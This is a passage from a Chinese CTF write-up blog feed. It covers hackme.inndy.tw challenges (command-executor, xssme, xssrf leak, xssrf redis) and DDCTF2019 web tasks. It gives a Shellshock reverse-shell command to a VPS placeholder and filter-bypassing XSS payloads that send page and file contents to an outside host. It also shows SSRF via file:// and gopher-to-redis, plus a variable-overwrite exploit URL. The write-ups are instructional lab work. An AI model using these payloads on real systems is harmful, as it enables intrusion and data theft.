O_RDONLY);</span><br><span class="line"><span class="keyword">if</span>(fd &gt; <span class="number">0</span>) &#123;</span><br><span class="line"><span class="keyword">int</span> s = <span class="built_in">read</span>(fd, buff, <span class="number">1024</span>);</span><br><span class="line"><span class="keyword">if</span>(s &gt; <span class="number">0</span>) &#123;</span><br><span class="line"><span class="built_in">write</span>(<span class="number">1</span>, buff, s);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">close</span>(fd);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="built_in">write</span>(<span class="number">1</span>, <span class="string">"Can not open file\n"</span>, <span class="number">18</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="built_in">write</span>(<span class="number">1</span>, <span class="string">"Wrong response\n"</span>, <span class="number">16</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>代码的大致意思就是要我们一秒内把它输出的内容在输入回去，即可以打出文件内容，但是以我们现在的交互方式显然太慢了，最好反弹一个shell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget --header&#x3D;&quot;X-Exploit: () &#123; : ; &#125;; &#x2F;bin&#x2F;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;your_vps_ip&#x2F;8888 0&gt;&amp;1&quot; -q -O -  &quot;https:&#x2F;&#x2F;command-executor.hackme.inndy.tw&#x2F;index.php?func&#x3D;cmd&amp;cmd&#x3D;env&quot;</span><br></pre></td></tr></table></figure><p>又发现在/var/tmp目录是可写的，所以我们可以利用该目录来读flag</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag-reader flag &gt; /var/tmp/content &lt; /var/tmp/content</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat content</span><br></pre></td></tr></table></figure><h1 id="xssme"><a href="#xssme" class="headerlink" title="xssme"></a>xssme</h1><p>先注册一个账号登录一下， 发现有一个send email功能，而题目又说xssme，猜测应该是存在xss漏洞，测试一下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(&#39;123&#39;)&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><p>回显script标签和（被过滤了，尝试绕过，onerror等也都被过滤了，发现可以用svg/onload来做</p><p><img src="/2020/09/13/hackme-1/7.png" alt="payload"></p><p>然后在自己的ceve账号中收到回显</p><p><img src="/2020/09/13/hackme-1/6.png" alt="回显"></p><h1 id="xssrf-leak"><a href="#xssrf-leak" class="headerlink" title="xssrf leak"></a>xssrf leak</h1><p>上一题中有一个PHPSESSID，尝试用这个cookie访问一下，可以看到页面有回显</p><blockquote><p>Admin only allowed from localhost, but you came from 192.168.123.1</p></blockquote><p>修改了请求头也没有用，看了别人的思路我们可以利用xss来本地读取文件，看到了一个方法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg&#x2F;onload&#x3D;&quot;document.location&#x3D;&#39;http:&#x2F;&#x2F;ov0eg5.ceye.io&#x2F;?&#39;+btoa(document.body.innerHTML)&quot;&gt;</span><br></pre></td></tr></table></figure><p>但是遭到了过滤，我们可以考虑用HTML实体编码绕过</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg&#x2F;onload&#x3D;&quot;&amp;#100;&amp;#111;&amp;#99;&amp;#117;&amp;#109;&amp;#101;&amp;#110;&amp;#116;&amp;#46;&amp;#108;&amp;#111;&amp;#99;&amp;#97;&amp;#116;&amp;#105;&amp;#111;&amp;#110;&amp;#61;&#39;&amp;#104;&amp;#116;&amp;#116;&amp;#112;&amp;#58;&amp;#47;&amp;#47;&amp;#111;&amp;#118;&amp;#48;&amp;#101;&amp;#103;&amp;#53;&amp;#46;&amp;#99;&amp;#101;&amp;#121;&amp;#101;&amp;#46;&amp;#105;&amp;#111;&amp;#47;&amp;#63;&#39;&amp;#43;&amp;#98;&amp;#116;&amp;#111;&amp;#97;&amp;#40;&amp;#100;&amp;#111;&amp;#99;&amp;#117;&amp;#109;&amp;#101;&amp;#110;&amp;#116;&amp;#46;&amp;#98;&amp;#111;&amp;#100;&amp;#121;&amp;#46;&amp;#105;&amp;#110;&amp;#110;&amp;#101;&amp;#114;&amp;#72;&amp;#84;&amp;#77;&amp;#76;&amp;#41;&quot;&gt;</span><br></pre></td></tr></table></figure><p>果然可以收到payload，base64解码一下再保存为html格式打开</p><p><img src="/2020/09/13/hackme-1/8.png" alt></p><p>send request功能有个request.php，尝试读取该页面</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg&#x2F;onload&#x3D;&quot;</span><br><span class="line">xmlhttp&#x3D;new XMLHttpRequest();</span><br><span class="line">xmlhttp.onreadystatechange&#x3D;function()</span><br><span class="line">&#123;</span><br><span class="line">    if (xmlhttp.readyState&#x3D;&#x3D;4 &amp;&amp; xmlhttp.status&#x3D;&#x3D;200)</span><br><span class="line">    &#123;</span><br><span class="line">        document.location&#x3D;&#39;http:&#x2F;&#x2F;vps_ip:23333&#x2F;?&#39;+btoa(xmlhttp.responseText);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">xmlhttp.open(&quot;GET&quot;,&quot;request.php&quot;,true);</span><br><span class="line">xmlhttp.send();</span><br><span class="line">&quot;&gt;</span><br></pre></td></tr></table></figure><p>编码一下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg&#x2F;onload&#x3D;&quot;&amp;#120;&amp;#109;&amp;#108;&amp;#104;&amp;#116;&amp;#116;&amp;#112;&amp;#61;&amp;#110;&amp;#101;&amp;#119;&amp;#32;&amp;#88;&amp;#77;&amp;#76;&amp;#72;&amp;#116;&amp;#116;&amp;#112;&amp;#82;&amp;#101;&amp;#113;&amp;#117;&amp;#101;&amp;#115;&amp;#116;&amp;#40;&amp;#41;&amp;#59;&amp;#10;&amp;#120;&amp;#109;&amp;#108;&amp;#104;&amp;#116;&amp;#116;&amp;#112;&amp;#46;&amp;#111;&amp;#110;&amp;#114;&amp;#101;&amp;#97;&amp;#100;&amp;#121;&amp;#115;&amp;#116;&amp;#97;&amp;#116;&amp;#101;&amp;#99;&amp;#104;&amp;#97;&amp;#110;&amp;#103;&amp;#101;&amp;#61;&amp;#102;&amp;#117;&amp;#110;&amp;#99;&amp;#116;&amp;#105;&amp;#111;&amp;#110;&amp;#40;&amp;#41;&amp;#10;&amp;#123;&amp;#10;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#105;&amp;#102;&amp;#32;&amp;#40;&amp;#120;&amp;#109;&amp;#108;&amp;#104;&amp;#116;&amp;#116;&amp;#112;&amp;#46;&amp;#114;&amp;#101;&amp;#97;&amp;#100;&amp;#121;&amp;#83;&amp;#116;&amp;#97;&amp;#116;&amp;#101;&amp;#61;&amp;#61;&amp;#52;&amp;#32;&amp;#38;&amp;#38;&amp;#32;&amp;#120;&amp;#109;&amp;#108;&amp;#104;&amp;#116;&amp;#116;&amp;#112;&amp;#46;&amp;#115;&amp;#116;&amp;#97;&amp;#116;&amp;#117;&amp;#115;&amp;#61;&amp;#61;&amp;#50;&amp;#48;&amp;#48;&amp;#41;&amp;#10;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#123;&amp;#10;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#100;&amp;#111;&amp;#99;&amp;#117;&amp;#109;&amp;#101;&amp;#110;&amp;#116;&amp;#46;&amp;#108;&amp;#111;&amp;#99;&amp;#97;&amp;#116;&amp;#105;&amp;#111;&amp;#110;&amp;#61;&#39;&amp;#104;&amp;#116;&amp;#116;&amp;#112;&amp;#58;&amp;#47;&amp;#47;&amp;#49;&amp;#51;&amp;#56;&amp;#46;&amp;#54;&amp;#56;&amp;#46;&amp;#50;&amp;#57;&amp;#46;&amp;#57;&amp;#50;&amp;#58;&amp;#50;&amp;#51;&amp;#51;&amp;#51;&amp;#51;&amp;#47;&amp;#63;&#39;&amp;#43;&amp;#98;&amp;#116;&amp;#111;&amp;#97;&amp;#40;&amp;#120;&amp;#109;&amp;#108;&amp;#104;&amp;#116;&amp;#116;&amp;#112;&amp;#46;&amp;#114;&amp;#101;&amp;#115;&amp;#112;&amp;#111;&amp;#110;&amp;#115;&amp;#101;&amp;#84;&amp;#101;&amp;#120;&amp;#116;&amp;#41;&amp;#59;&amp;#10;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#125;&amp;#10;&amp;#125;&amp;#10;&amp;#120;&amp;#109;&amp;#108;&amp;#104;&amp;#116;&amp;#116;&amp;#112;&amp;#46;&amp;#111;&amp;#112;&amp;#101;&amp;#110;&amp;#40;&amp;#34;&amp;#71;&amp;#69;&amp;#84;&amp;#34;&amp;#44;&amp;#34;&amp;#114;&amp;#101;&amp;#113;&amp;#117;&amp;#101;&amp;#115;&amp;#116;&amp;#46;&amp;#112;&amp;#104;&amp;#112;&amp;#34;&amp;#44;&amp;#116;&amp;#114;&amp;#117;&amp;#101;&amp;#41;&amp;#59;&amp;#10;&amp;#120;&amp;#109;&amp;#108;&amp;#104;&amp;#116;&amp;#116;&amp;#112;&amp;#46;&amp;#115;&amp;#101;&amp;#110;&amp;#100;&amp;#40;&amp;#41;&amp;#59;&quot;&gt;</span><br></pre></td></tr></table></figure><p>然后在vps上即可收到base64字符串，解码</p><p><img src="/2020/09/13/hackme-1/9.png" alt></p><p>这应该就是题目的利用位置，我们尝试读config.php文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg&#x2F;onload&#x3D;&quot;</span><br><span class="line">xmlhttp&#x3D;new XMLHttpRequest();</span><br><span class="line">xmlhttp.onreadystatechange&#x3D;function()</span><br><span class="line">&#123;</span><br><span class="line">    if (xmlhttp.readyState&#x3D;&#x3D;4 &amp;&amp; xmlhttp.status&#x3D;&#x3D;200)</span><br><span class="line">    &#123;</span><br><span class="line">        document.location&#x3D;&#39;http:&#x2F;&#x2F;vps_ip:23333&#x2F;?&#39;+btoa(xmlhttp.responseText);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">xmlhttp.open(&quot;POST&quot;,&quot;request.php&quot;,true);</span><br><span class="line">xmlhttp.setRequestHeader(&quot;Content-type&quot;,&quot;application&#x2F;x-www-form-urlencoded&quot;);</span><br><span class="line">xmlhttp.send(&quot;url&#x3D;file:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;config.php&quot;);</span><br><span class="line">&quot;&gt;</span><br></pre></td></tr></table></figure><p>编码发送，果然可以收到flag</p><p><img src="/2020/09/13/hackme-1/10.png" alt="result"></p><h1 id="xssrf-redis"><a href="#xssrf-redis" class="headerlink" title="xssrf redis"></a>xssrf redis</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg&#x2F;onload&#x3D;&quot;</span><br><span class="line">xmlhttp&#x3D;new XMLHttpRequest();</span><br><span class="line">xmlhttp.onreadystatechange&#x3D;function()</span><br><span class="line">&#123;</span><br><span class="line">    if (xmlhttp.readyState&#x3D;&#x3D;4 &amp;&amp; xmlhttp.status&#x3D;&#x3D;200)</span><br><span class="line">    &#123;</span><br><span class="line">        document.location&#x3D;&#39;http:&#x2F;&#x2F;vps_ip:23333&#x2F;?&#39;+btoa(xmlhttp.responseText);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">xmlhttp.open(&quot;POST&quot;,&quot;request.php&quot;,true);</span><br><span class="line">xmlhttp.setRequestHeader(&quot;Content-type&quot;,&quot;application&#x2F;x-www-form-urlencoded&quot;);</span><br><span class="line">xmlhttp.send(&quot;url&#x3D;gopher:&#x2F;&#x2F;127.0.0.1:25566&#x2F;_KEYS%2520*%250a_quit&quot;);</span><br><span class="line">&quot;&gt;</span><br></pre></td></tr></table></figure><p>发现有flag，读取之</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xmlhttp.send(&quot;url&#x3D;gopher:&#x2F;&#x2F;127.0.0.1:25566&#x2F;_lrange%2520flag%25200%252053%250a_quit&quot;);</span><br></pre></td></tr></table></figure><p>然后处理一下即可得到flag</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;历史文章补发&lt;/p&gt;
&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;最近rootme网站好像有点问题，所以刷点hackme网站的题目，网址&lt;a href=&quot;https://hackme.inndy.tw/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://hackme.inndy.tw/&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="writeup" scheme="http://chaosec.top/categories/writeup/"/>
    
    
      <category term="CTF" scheme="http://chaosec.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>DDCTF2019</title>
    <link href="http://chaosec.top/2020/09/13/DDCTF2019/"/>
    <id>http://chaosec.top/2020/09/13/DDCTF2019/</id>
    <published>2020-09-13T13:02:17.000Z</published>
    <updated>2020-09-26T07:24:06.439Z</updated>
    
    <content type="html"><![CDATA[<p>历史文章补发</p><a id="more"></a><h1 id="滴"><a href="#滴" class="headerlink" title="滴~"></a>滴~</h1><p>签到题</p><p>访问首页看到jpg参数请求有点想base64，测试发现是将文件名进行16进制编码后再进行两次base64编码，按照该方法构造index.php发现可以实现成功读取到index.php源码 </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * https://blog.csdn.net/FengBanLiuYun/article/details/80616607</span></span><br><span class="line"><span class="comment"> * Date: July 4,2018</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">error_reporting(E_ALL || ~E_NOTICE);</span><br><span class="line">header(<span class="string">'content-type:text/html;charset=utf-8'</span>);</span><br><span class="line"><span class="keyword">if</span>(! <span class="keyword">isset</span>($_GET[<span class="string">'jpg'</span>]))</span><br><span class="line">    header(<span class="string">'Refresh:0;url=./index.php?jpg=TmpZMlF6WXhOamN5UlRaQk56QTJOdz09'</span>);</span><br><span class="line">$file = hex2bin(base64_decode(base64_decode($_GET[<span class="string">'jpg'</span>])));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;title&gt;'</span>.$_GET[<span class="string">'jpg'</span>].<span class="string">'&lt;/title&gt;'</span>;</span><br><span class="line">$file = preg_replace(<span class="string">"/[^a-zA-Z0-9.]+/"</span>,<span class="string">""</span>, $file);</span><br><span class="line"><span class="keyword">echo</span> $file.<span class="string">'&lt;/br&gt;'</span>;</span><br><span class="line">$file = str_replace(<span class="string">"config"</span>,<span class="string">"!"</span>, $file);</span><br><span class="line"><span class="keyword">echo</span> $file.<span class="string">'&lt;/br&gt;'</span>;</span><br><span class="line">$txt = base64_encode(file_get_contents($file));</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;img src='data:image/gif;base64,"</span>.$txt.<span class="string">"'&gt;&lt;/img&gt;"</span>;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Can you find the flag file?</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>发现了注释中有文章链接，访问之后看到历史文章有和注释中日期相同的文章，发现是swp文件泄露的相关文章，测试发现存在<code>practice.txt.swp</code>页面</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">f1ag!ddctf.php</span><br></pre></td></tr></table></figure><p>我们可以按照上面的方法读取该文件，因为该页面过滤特殊字符，但是同时又把<code>config</code>替换为<code>!</code>，所以我们可以构造文件名<code>f1agconfigddctf.php</code>成功读取到源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">'config.php'</span>);</span><br><span class="line">$k = <span class="string">'hello'</span>;</span><br><span class="line">extract($_GET);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($uid))</span><br><span class="line">&#123;</span><br><span class="line">    $content=trim(file_get_contents($k));</span><br><span class="line">    <span class="keyword">if</span>($uid==$content)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> $flag;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span><span class="string">'hello'</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>很明显的变量覆盖漏洞</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;117.51.150.246&#x2F;f1ag!ddctf.php?uid&#x3D;&amp;k&#x3D;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DDCTF&#123;436f6e67726174756c6174696f6e73&#125;</span><br></pre></td></tr></table></figure><h1 id="WEB-签到题"><a href="#WEB-签到题" class="headerlink" title="WEB 签到题"></a>WEB 签到题</h1><p>题目需要我们以admin身份登录，查看网络信息发现一个中间页面Auth.php，在该请求头中看到了didictf_username字段，猜测修改该字段即可以admin身份登录，抓包修改一下</p><p><img src="https://i.loli.net/2019/05/20/5ce296dc16dc917104.png" alt></p><p>即可以admin身份登录</p><p><img src="https://i.loli.net/2019/05/20/5ce297062e1c059824.png" alt></p><p>访问该页面可以看到两个源码</p><p><a href="http://117.51.158.44/app/fL2XID2i0Cdh.php" target="_blank" rel="noopener">http://117.51.158.44/app/fL2XID2i0Cdh.php</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//url:app/Application.php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">Class</span> <span class="title">Application</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> $path = <span class="string">''</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">response</span><span class="params">($data, $errMsg = <span class="string">'success'</span>)</span> </span>&#123;</span><br><span class="line">        $ret = [<span class="string">'errMsg'</span> =&gt; $errMsg,</span><br><span class="line">            <span class="string">'data'</span> =&gt; $data];</span><br><span class="line">        $ret = json_encode($ret);</span><br><span class="line">        header(<span class="string">'Content-type: application/json'</span>);</span><br><span class="line">        <span class="keyword">echo</span> $ret;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">auth</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $DIDICTF_ADMIN = <span class="string">'admin'</span>;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">empty</span>($_SERVER[<span class="string">'HTTP_DIDICTF_USERNAME'</span>]) &amp;&amp; $_SERVER[<span class="string">'HTTP_DIDICTF_USERNAME'</span>] == $DIDICTF_ADMIN) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;response(<span class="string">'您当前当前权限为管理员----请访问:app/fL2XID2i0Cdh.php'</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">TRUE</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;response(<span class="string">'抱歉，您没有登陆权限，请获取权限后访问-----'</span>,<span class="string">'error'</span>);</span><br><span class="line">            <span class="keyword">exit</span>();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">sanitizepath</span><span class="params">($path)</span> </span>&#123;</span><br><span class="line">    $path = trim($path);</span><br><span class="line">    $path=str_replace(<span class="string">'../'</span>,<span class="string">''</span>,$path);</span><br><span class="line">    $path=str_replace(<span class="string">'..\\'</span>,<span class="string">''</span>,$path);</span><br><span class="line">    <span class="keyword">return</span> $path;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;path)) &#123;</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $path = <span class="keyword">$this</span>-&gt;sanitizepath(<span class="keyword">$this</span>-&gt;path);</span><br><span class="line">        <span class="keyword">if</span>(strlen($path) !== <span class="number">18</span>) &#123;</span><br><span class="line">            <span class="keyword">exit</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;response($data=file_get_contents($path),<span class="string">'Congratulations'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//url:app/Session.php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">'Application.php'</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Session</span> <span class="keyword">extends</span> <span class="title">Application</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//key建议为8位字符串</span></span><br><span class="line">    <span class="keyword">var</span> $eancrykey                  = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">var</span> $cookie_expiration= <span class="number">7200</span>;</span><br><span class="line">    <span class="keyword">var</span> $cookie_name                = <span class="string">'ddctf_id'</span>;</span><br><span class="line">    <span class="keyword">var</span> $cookie_path= <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">var</span> $cookie_domain= <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">var</span> $cookie_secure= <span class="keyword">FALSE</span>;</span><br><span class="line">    <span class="keyword">var</span> $activity                   = <span class="string">"DiDiCTF"</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">parent</span>::auth()) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;get_key();</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;session_read()) &#123;</span><br><span class="line">                $data = <span class="string">'DiDI Welcome you %s'</span>;</span><br><span class="line">                $data = sprintf($data,$_SERVER[<span class="string">'HTTP_USER_AGENT'</span>]);</span><br><span class="line">                <span class="keyword">parent</span>::response($data,<span class="string">'sucess'</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;session_create();</span><br><span class="line">                $data = <span class="string">'DiDI Welcome you'</span>;</span><br><span class="line">                <span class="keyword">parent</span>::response($data,<span class="string">'sucess'</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">get_key</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="comment">//eancrykey  and flag under the folder</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;eancrykey =  file_get_contents(<span class="string">'../config/key.txt'</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">session_read</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">empty</span>($_COOKIE)) 